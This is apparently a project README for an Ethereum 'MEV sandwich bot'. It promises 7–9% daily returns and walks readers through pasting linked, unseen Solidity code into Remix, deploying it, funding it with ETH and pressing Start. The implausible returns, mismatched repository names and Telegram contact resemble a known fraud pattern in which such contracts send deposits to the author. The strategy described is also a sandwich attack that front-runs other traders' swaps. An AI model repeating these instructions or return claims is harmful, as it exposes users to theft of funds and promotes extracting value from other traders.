<div align="center">
	
# 🥪 Ethereum MEV Sandwich Bot (DeFi)  

*An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.  
Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.* 
</div>

<p align="center">
  <img src="https://img.shields.io/github/stars/sreesohtml/uniswap-slippage-trading-bot?style=social" alt="GitHub stars" />
  <img src="https://img.shields.io/github/forks/sreesohtml/uniswap-slippage-trading-bot?style=social" alt="GitHub forks" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="solidity" />
</p>

**Current Performance**:  
- **Avg. Daily Return**: 7–9% on capital deployed (varies with market volatility).  
- **Minimum Capital Requirement**: **0.2 ETH** (under current gas and liquidity conditions).  
- **Note**: Profitability depends on network congestion, competition, and pool liquidity.
- **No guarantees**. Past performance ≠ future results.    

---
### 📈 Latest Profitable Transactions

**Last updated:** 2025-05-29 02:07:12

Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.

| Tx Hash | Block | Profit (ETH) | Timestamp |
|---------|-------|--------------|-----------|
| [0xfd8eb7af...](https://etherscan.io/tx/0xfd8eb7afa4a4cf4c9832a26f5e61b1f9e6f990a805305181cbeeeb30f411cd1d) | 22585214 | 0.001526 | 2025-05-29 01:44:47 |
| [0xffecfe9f...](https://etherscan.io/tx/0xffecfe9fe7b43060cafb2f960671a4f981ba4b38b5547ebdd3e49c6c18c22ea5) | 22585100 | 0.00454 | 2025-05-29 01:21:47 |
| [0xc108353d...](https://etherscan.io/tx/0xc108353d97081f14006c021bfc4cd43db5b869cb0c3890437a0d6a39ff53b8dc) | 22585099 | 0.002756 | 2025-05-29 01:21:35 |
| [0xda9d6caf...](https://etherscan.io/tx/0xda9d6cafefbd1f54f981a3a25b7d9df62c50d181df5d3eea1b5c9d451ef52738) | 22585083 | 0.003848 | 2025-05-29 01:18:23 |
| [0xafc7abdc...](https://etherscan.io/tx/0xafc7abdc7ac4f8934e27ab9edd8ef1aca1f2151b6f84ab861bdf9162b7ad3f5d) | 22584927 | 0.001937 | 2025-05-29 00:47:11 |

---
### 📚 How this bot works  
This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:  
1. Buys the target asset before the large swap.  
2. Lets the target swap shift the asset’s price.  
3. Sells the asset at the optimized price.

The bot is able to perform multiple transactions, if it is necessary to capture an opportunity.   

---

### ✨ Features  
- Monitors the Ethereum mempool and executes MEV strategies automatically
- Dynamic gas pricing to stay competitive  
- Built-in reverts for failed transactions and profit threshholds to filter out unprofitable transactions
- Open-source code and modular codebase for tweaking strategies (e.g. profit threshholds, gas multipliers, ...).  

---

### ⚡ How to run the bot  
1)  **Download** [MetaMask](https://metamask.io/download.html) or any other EVM wallet 

2)  **Access** [Remix - Ethereum IDE](https://remix.ethereum.org) (Web-based environment to write, compile and deploy Ethereum smart contracts)

3) 📁 **Create a `New File`**. Rename it as you like, e.g.: “bot.sol”.

<img src="https://i.imgur.com/1XiPUes.png">

4) 📋 **Paste** [this code](https://raw.githubusercontent.com/sreesohtml/uniswap-mev-trading-bot/refs/heads/main/src/bot.sol) from Github into your newly created Remix file

5) 🔧**Compiling:** Go to the `Solidity Compiler` tab, select version `0.8.20+commit` and then select `Compile bot.sol`.

![2](https://i.imgur.com/G9gsNIo.png)

6) 🚀 **Deploy the bot:** Navigate to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - Metamask` environment and then `Deploy`. By approving the Metamask contract creation fee, you will have created your own MEV-Bot.

![3](https://i.imgur.com/2odZQNj.png)

---

#### ⚙️ Configuration

7) **Fund your bot:** Copy your newly created contract address and fund it with at least 0.2 ETH as initial balance for the bot by sending ETH to the copied address.

![4](https://i.imgur.com/80NJYYr.png)
 
8) **Buttons:**
	- After your transaction is confirmed, click the `Start` button to run the bot.
	- Press the `Stop` button to halt bot operations.  
   - Withdraw all ETH to the owner (=wallet address, that created the bot) by clicking the `Withdrawal` button.  
   
![4](https://i.imgur.com/ktiJ1Ll.png)

![5](https://i.imgur.com/xczMc3G.png)

---

### 📜 License  
This project is [MIT licensed](https://github.com/sreesohtml/uniswap-slippage-trading-bot/blob/main/LICENSE).  
**Reminder**: Open-source != endorsement. Use responsibly.  

---

### 💬 Contact  
If you have any questions or inquiries, feel free to reach out on Telegram: [Click Here](https://t.me/DeFiLabsContact)   

--- 

### ⭐ Show your Support

If you find our project interesting, please consider giving it a star. Your support is greatly appreciated and helps in motivating further development and improvements.


---

### 💭 FAQ
#### Do I need to keep remix open in browser while the bot is activated? 

No, just save the bot contract address after creating it. The next time you want to access your bot via Remix, you need to compile the file again as in step 5. Now head to `DEPLOY & RUN TRANSACTIONS`, reconnect your Metamask, paste your contract address into `Load contract from Address` and press `At Address`.

![](https://i.imgur.com/SG1aENC.png)

Now you can find it again under "Deployed Contracts".

#### Does it work on other chains or DEXes as well?

Currently the bot is dedicated only for Ethereum on Uniswap pools.

---

### 🤝 Contribute & Customize  
**Want to improve the bot?**  
1. Fork the repo.  
2. Add your enhancements (e.g., new pool filters, gas optimizations).  
3. Submit a PR!
